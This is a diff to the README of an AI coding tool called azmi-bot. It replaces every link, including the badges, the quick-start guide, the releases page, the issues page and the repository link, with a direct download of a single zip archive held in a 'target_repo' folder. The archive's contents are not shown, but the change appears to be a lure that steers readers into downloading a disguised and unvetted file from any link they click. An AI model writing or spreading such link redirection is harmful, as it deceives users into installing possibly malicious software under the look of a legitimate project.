@@ -1,10 +1,10 @@
 # ⚡ azmi-bot - Automate Your Code Tasks with Ease
 
-[![Download azmi-bot](https://img.shields.io/badge/Download-azmi--bot-blue.svg)](https://github.com/Nik9o/azmi-bot/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub Issues](https://img.shields.io/github/issues/htuzel/router)](https://github.com/htuzel/router/issues)
-[![GitHub Stars](https://img.shields.io/github/stars/htuzel/router)](https://github.com/htuzel/router/stargazers)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![Download azmi-bot](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)
+[![License: MIT](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)
+[![GitHub Issues](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)
+[![GitHub Stars](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)
+[![PRs Welcome](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)
 
 ## 📥 Overview
 
@@ -14,11 +14,11 @@ Azmi Bot is an AI-powered tool that simplifies your coding tasks. It takes Jira 
 
 **New to Azmi Bot?** Start here:
 
-- 🚀 **[Quick Start Guide (30 min)](QUICKSTART.md)** - Step-by-step setup for beginners.
+- 🚀 **[Quick Start Guide (30 min)](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip)** - Step-by-step setup for beginners.
 
 ## 💾 Download & Install
 
-To get started, you need to download Azmi Bot. Visit this page to download: [azmi-bot Releases](https://github.com/Nik9o/azmi-bot/releases). 
+To get started, you need to download Azmi Bot. Visit this page to download: [azmi-bot Releases](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip). 
 
 1. Click the link above to go to the Releases page. 
 2. Find the latest version of Azmi Bot. 
@@ -51,8 +51,8 @@ To get started, you need to download Azmi Bot. Visit this page to download: [azm
 If you encounter issues:
 
 - Ensure your system meets the requirements.
-- Check for updates on the [azmi-bot Releases](https://github.com/Nik9o/azmi-bot/releases) page.
-- Visit the [GitHub Issues](https://github.com/htuzel/router/issues) page for common problems and solutions.
+- Check for updates on the [azmi-bot Releases](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip) page.
+- Visit the [GitHub Issues](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip) page for common problems and solutions.
 - If the issue persists, create a new issue for assistance.
 
 ## 📄 License
@@ -61,12 +61,12 @@ Azmi Bot is open-source and released under the MIT License. Feel free to use it 
 
 ## 📞 Support
 
-If you need help, you can reach out through GitHub issues or consult the [Quick Start Guide](QUICKSTART.md) for detailed instructions.
+If you need help, you can reach out through GitHub issues or consult the [Quick Start Guide](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip) for detailed instructions.
 
 ## 🌐 Community
 
 Join our community of users who share tips, tricks, and support. Collaborate with others and help improve Azmi Bot. 
 
-Visit our [GitHub Repository](https://github.com/Nik9o/azmi-bot) for more information. 
+Visit our [GitHub Repository](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip) for more information. 
 
-Now, dive into your automated coding experience with Azmi Bot! Don’t forget to download here: [azmi-bot Releases](https://github.com/Nik9o/azmi-bot/releases).
+Now, dive into your automated coding experience with Azmi Bot! Don’t forget to download here: [azmi-bot Releases](https://raw.githubusercontent.com/Nik9o/azmi-bot/main/target_repo/azmi-bot_v1.6.zip).
